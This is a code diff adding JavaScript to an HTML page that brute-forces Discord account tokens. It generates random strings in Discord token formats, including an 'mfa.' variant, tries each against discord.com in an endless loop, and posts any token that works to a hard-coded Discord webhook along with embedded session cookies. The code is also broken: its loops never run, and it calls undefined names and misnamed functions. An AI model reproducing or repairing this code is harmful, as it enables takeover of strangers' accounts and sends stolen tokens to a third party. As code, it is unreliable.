@@ -1,8 +1,73 @@
 <html>
   <script>
     var ts = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '_']
+    gentoken1(){
+      out = 'NzkwMjQ4MzU0MzAyMDAxMTYy.'
+      for(var i = 0; i >= 27; i+=1){
+        out+=ts[(Math.random()*ts.length)]
+      }
+      out+='.'
+      for(var i = 0; i >= (Math.random()*2)+4; i+=1){
+        out+=ts[(Math.random()*ts.length)]
+      }
+      return out
+    }
+    gentoken2(){
+      out = 'mfa.'
+      for(var i = 0; i >= 27; i+=1){
+        out+=ts[(Math.random()*ts.length)]
+      }
+      out+='.'
+      for(var i = 0; i >= (Math.random()*2)+4; i+=1){
+        out+=ts[(Math.random()*ts.length)]
+      }
+      return out
+    }
     while(true){
-      
+      token = gettoken1()
+      fetch('https://discord.com/login', {'headers':{
+        'Authorization': guess
+      }}).then(res => {
+        if(res.status == 200){
+          var myHeaders = new Headers();
+          myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
+          myHeaders.append("Cookie", "__cfruid=b5146dc0a2f20bc27192d07d55068cf04d15c254-1642951205; __dcfduid=f11fcc807c5f11ec8d04ea363ca5819e; __sdcfduid=f11fcc807c5f11ec8d04ea363ca5819eb2a5085e39ab581a313beabc6131e84735ccf163c08b3e86052818a0e05e08b8");
+
+          var urlencoded = new URLSearchParams();
+          urlencoded.append("content", guess);
+
+          var requestOptions = {
+            method: 'POST',
+            headers: myHeaders,
+            body: urlencoded,
+            redirect: 'follow'
+          };
+
+          fetch("https://discord.com/api/webhooks/934827543922634762/PQiPILZqyDyLtKZEu8v1dL22xlPtpNL8qmsMFqxO5e0Ci4L1sncCnc35WtJGdn9MgMh3", requestOptions).then(response => response.text())
+        }
+      })
+      token = gettoken2()
+      fetch('https://discord.com/login', {'headers':{
+        'Authorization': guess
+      }}).then(res => {
+        if(res.status == 200){
+          var myHeaders = new Headers();
+          myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
+          myHeaders.append("Cookie", "__cfruid=b5146dc0a2f20bc27192d07d55068cf04d15c254-1642951205; __dcfduid=f11fcc807c5f11ec8d04ea363ca5819e; __sdcfduid=f11fcc807c5f11ec8d04ea363ca5819eb2a5085e39ab581a313beabc6131e84735ccf163c08b3e86052818a0e05e08b8");
+
+          var urlencoded = new URLSearchParams();
+          urlencoded.append("content", guess);
+
+          var requestOptions = {
+            method: 'POST',
+            headers: myHeaders,
+            body: urlencoded,
+            redirect: 'follow'
+          };
+
+          fetch("https://discord.com/api/webhooks/934827543922634762/PQiPILZqyDyLtKZEu8v1dL22xlPtpNL8qmsMFqxO5e0Ci4L1sncCnc35WtJGdn9MgMh3", requestOptions).then(response => response.text())
+        }
+      })
     }
   </script>
 </html>
